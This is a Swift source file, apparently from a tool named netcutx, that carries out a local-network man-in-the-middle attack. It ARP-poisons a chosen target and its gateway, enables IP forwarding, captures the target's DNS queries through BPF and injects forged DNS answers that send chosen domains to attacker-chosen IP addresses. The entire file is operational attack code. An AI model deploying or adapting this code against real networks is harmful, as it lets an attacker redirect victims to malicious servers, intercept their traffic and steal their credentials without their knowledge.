import Foundation

struct DNSRule {
    let domain: String
    let fakeIP: String
}

func parseDNSQuery(from payload: Data) -> (id: UInt16, domain: String)? {
    guard payload.count >= 12 else { return nil }
    let id = (UInt16(payload[0]) << 8) | UInt16(payload[1])
    let flags = (UInt16(payload[2]) << 8) | UInt16(payload[3])
    if (flags >> 15) & 1 != 0 { return nil }
    let qdcount = (UInt16(payload[4]) << 8) | UInt16(payload[5])
    guard qdcount >= 1 else { return nil }

    var pos = 12
    var domain = ""
    while pos < payload.count {
        let len = Int(payload[pos])
        if len == 0 { pos += 1; break }
        guard pos + 1 + len <= payload.count else { return nil }
        if !domain.isEmpty { domain += "." }
        for i in 0..<len {
            let c = payload[pos + 1 + i]
            domain += String(UnicodeScalar(c))
        }
        pos += 1 + len
    }

    return (id, domain)
}

func buildDNSResponse(id: UInt16, domain: String, fakeIP: String, ttl: UInt32 = 5) -> Data {
    var d = Data()
    d.append(UInt8(id >> 8)); d.append(UInt8(id & 0xFF))
    d.append(0x81); d.append(0x80) // flags: response + no error
    d.append(0x00); d.append(0x01) // questions: 1
    d.append(0x00); d.append(0x01) // answers: 1
    d.append(0x00); d.append(0x00) // authority: 0
    d.append(0x00); d.append(0x00) // additional: 0

    // Question
    for label in domain.split(separator: ".") {
        d.append(UInt8(label.count))
        d.append(contentsOf: label.utf8)
    }
    d.append(0x00)
    d.append(0x00); d.append(0x01) // QTYPE A
    d.append(0x00); d.append(0x01) // QCLASS IN

    // Answer — name pointer to question
    d.append(0xC0); d.append(0x0C) // pointer to offset 12
    d.append(0x00); d.append(0x01) // TYPE A
    d.append(0x00); d.append(0x01) // CLASS IN
    d.append(UInt8((ttl >> 24) & 0xFF)); d.append(UInt8((ttl >> 16) & 0xFF))
    d.append(UInt8((ttl >> 8) & 0xFF)); d.append(UInt8(ttl & 0xFF))
    d.append(0x00); d.append(0x04) // RDLENGTH = 4

    let ip = fakeIP.split(separator: ".").compactMap { UInt8($0) }
    d.append(contentsOf: ip)

    return d
}

func buildDNSResponseFrame(ourMAC: MACAddr, targetMAC: MACAddr,
                            dnsServerIP: String, targetIP: String,
                            queryPort: UInt16, dnsResponse: Data) -> Data? {
    guard let dnsBytes = ipToBytes(dnsServerIP),
          let dstBytes = ipToBytes(targetIP) else { return nil }

    let udpLen = UInt16(8 + dnsResponse.count)
    let totalLen = UInt16(20 + udpLen)

    var ip = [UInt8](repeating: 0, count: 20)
    ip[0] = 0x45
    ip[2] = UInt8(totalLen >> 8); ip[3] = UInt8(totalLen & 0xFF)
    ip[4] = UInt8.random(in: 0...255); ip[5] = UInt8.random(in: 0...255)
    ip[6] = 0x40; ip[7] = 0
    ip[8] = 64; ip[9] = 17 // UDP
    ip[12] = dnsBytes[0]; ip[13] = dnsBytes[1]; ip[14] = dnsBytes[2]; ip[15] = dnsBytes[3]
    ip[16] = dstBytes[0]; ip[17] = dstBytes[1]; ip[18] = dstBytes[2]; ip[19] = dstBytes[3]

    let ipCS = computeChecksum(ip)
    ip[10] = UInt8(ipCS >> 8); ip[11] = UInt8(ipCS & 0xFF)

    var udp = [UInt8](repeating: 0, count: 8)
    udp[0] = 0; udp[1] = 53 // source: DNS port
    udp[2] = UInt8(queryPort >> 8); udp[3] = UInt8(queryPort & 0xFF)
    udp[4] = UInt8(udpLen >> 8); udp[5] = UInt8(udpLen & 0xFF)
    udp[6] = 0; udp[7] = 0

    var frame = Data()
    frame.append(contentsOf: macToBytes(targetMAC))
    frame.append(contentsOf: macToBytes(ourMAC))
    frame.append(0x08); frame.append(0x00)
    frame.append(contentsOf: ip)
    frame.append(contentsOf: udp)
    frame.append(dnsResponse)
    return frame
}

func extractDNSFrame(_ data: Data) -> (srcIP: String, dstIP: String,
                                                srcPort: UInt16, dstPort: UInt16,
                                                srcMAC: MACAddr?, dnsPayload: Data)? {
    guard data.count >= 42 else { return nil }
    let ethType = (UInt16(data[12]) << 8) | UInt16(data[13])
    guard ethType == 0x0800 else { return nil }

    let ipHL = Int(data[14] & 0x0F) * 4
    guard ipHL >= 20, data[23] == 17 else { return nil } // UDP only

    let srcIP = "\(data[26]).\(data[27]).\(data[28]).\(data[29])"
    let dstIP = "\(data[30]).\(data[31]).\(data[32]).\(data[33])"
    let srcMAC: MACAddr? = data.count >= 20 ? (data[6], data[7], data[8], data[9], data[10], data[11]) : nil

    let udpStart = 14 + ipHL
    guard data.count >= udpStart + 8 else { return nil }

    let srcPort = (UInt16(data[udpStart]) << 8) | UInt16(data[udpStart + 1])
    let dstPort = (UInt16(data[udpStart + 2]) << 8) | UInt16(data[udpStart + 3])
    let udpLen = Int((UInt16(data[udpStart + 4]) << 8) | UInt16(data[udpStart + 5]))

    let payloadStart = udpStart + 8
    guard payloadStart < data.count, udpLen >= 8 else { return nil }
    let payloadLen = min(udpLen - 8, data.count - payloadStart)
    let payload = data.subdata(in: payloadStart..<payloadStart + payloadLen)

    return (srcIP, dstIP, srcPort, dstPort, srcMAC, payload)
}

func dnsSpoofRun(bpf: NetcutxBPF, ourMAC: MACAddr, ourIP: String,
                 targetIP: String, targetMAC: MACAddr, rules: [DNSRule]) {
    guard !rules.isEmpty else { return }
    statusErr("DNS spoof active: \(rules.map { "\($0.domain)→\($0.fakeIP)" }.joined(separator: ", "))")

    while _stopFlag == 0 {
        guard let pkt = try? bpf.receive(timeout: 0.3) else { continue }
        guard let frame = extractDNSFrame(pkt.data) else { continue }

        if frame.dstPort != 53 || frame.srcIP != targetIP { continue }

        guard let query = parseDNSQuery(from: frame.dnsPayload) else { continue }

        for rule in rules {
            if query.domain == rule.domain || query.domain.hasSuffix(".\(rule.domain)") {
                let resp = buildDNSResponse(id: query.id, domain: query.domain, fakeIP: rule.fakeIP)
                guard let respFrame = buildDNSResponseFrame(ourMAC: ourMAC, targetMAC: targetMAC,
                                                             dnsServerIP: frame.dstIP, targetIP: targetIP,
                                                             queryPort: frame.srcPort, dnsResponse: resp) else {
                    continue
                }
                try? bpf.send(frame: respFrame)
                statusErr("[DNS] \(query.domain) → \(rule.fakeIP)")
                break
            }
        }
    }
}

func standaloneDNSSpoof(targetIP: String, rules: [DNSRule], interface: String? = nil) {
    let ifname: String
    if let provided = interface {
        ifname = provided
    } else if let detected = getDefaultInterface() {
        ifname = detected
    } else {
        fail("No interface detected")
        return
    }

    guard let ourIP = getInterfaceIP(ifname) else {
        fail("Cannot detect IP for \(ifname)")
        return
    }
    guard let ourMAC = getInterfaceMAC(ifname) else {
        fail("Cannot detect MAC")
        return
    }

    ok("Interface \(ifname) — \(ourIP)")
    status("Resolving MACs...")

    let bpf: NetcutxBPF
    do {
        bpf = try NetcutxBPF(interface: ifname)
    } catch {
        fail("BPF: \(error.localizedDescription)")
        return
    }

    guard let gw = getGatewayIP() else {
        bpf.close(); fail("Cannot detect gateway"); return
    }
    guard let gwMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: gw) else {
        bpf.close(); fail("Cannot resolve gateway MAC"); return
    }
    guard let targetMAC = try? resolveMAC(bpf: bpf, ourMAC: ourMAC, ourIP: ourIP, targetIP: targetIP) else {
        bpf.close(); fail("Cannot resolve MAC for \(targetIP)"); return
    }

    ok("Gateway \(gw) = \(macToString(gwMAC))")
    ok("Target \(targetIP) = \(macToString(targetMAC))")

    setupSignal()
    _ = setIPForwarding(true)

    status("MITM + DNS spoof starting...")
    print("")

    var round = 0
    var dnsSinceLastSend = 0

    while _stopFlag == 0 {
        // Send ARP poison every 10 iterations
        if dnsSinceLastSend >= 10 {
            round += 1
            try? bpf.send(frame: Data(ARPFrame.buildReply(
                srcMAC: ourMAC, srcIP: gw, dstMAC: targetMAC, dstIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: gw, victimMAC: targetMAC, victimIP: targetIP).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
                srcMAC: ourMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gw).bytes))
            try? bpf.send(frame: Data(ARPFrame.buildBroadcastSpoof(
                srcMAC: ourMAC, srcIP: targetIP, victimMAC: gwMAC, victimIP: gw).bytes))
            dnsSinceLastSend = 0
        }

        // Listen for DNS
        guard let pkt = try? bpf.receive(timeout: 0.05) else {
            dnsSinceLastSend += 1
            continue
        }

        guard let frame = extractDNSFrame(pkt.data) else {
            dnsSinceLastSend += 1
            continue
        }

        if frame.dstPort == 53 && frame.srcIP == targetIP {
            guard let query = parseDNSQuery(from: frame.dnsPayload) else { continue }

            for rule in rules {
                if query.domain == rule.domain || query.domain.hasSuffix(".\(rule.domain)") {
                    let resp = buildDNSResponse(id: query.id, domain: query.domain, fakeIP: rule.fakeIP)
                    guard let respFrame = buildDNSResponseFrame(
                        ourMAC: ourMAC, targetMAC: targetMAC,
                        dnsServerIP: frame.dstIP, targetIP: targetIP,
                        queryPort: frame.srcPort, dnsResponse: resp) else { continue }
                    try? bpf.send(frame: respFrame)
                    ok("[DNS] \(query.domain) → \(rule.fakeIP)")
                    break
                }
            }
        }

        dnsSinceLastSend += 1
    }

    print("")
    status("Restoring ARP...")
    for _ in 0..<3 {
        try? bpf.send(frame: Data(ARPFrame.buildReply(
            srcMAC: gwMAC, srcIP: gw, dstMAC: targetMAC, dstIP: targetIP).bytes))
        try? bpf.send(frame: Data(ARPFrame.buildAPPoison(
            srcMAC: targetMAC, srcIP: targetIP, targetMAC: gwMAC, targetIP: gw).bytes))
        Thread.sleep(forTimeInterval: 0.1)
    }
    _ = setIPForwarding(false)
    bpf.close()
    ok("ARP restored")
}
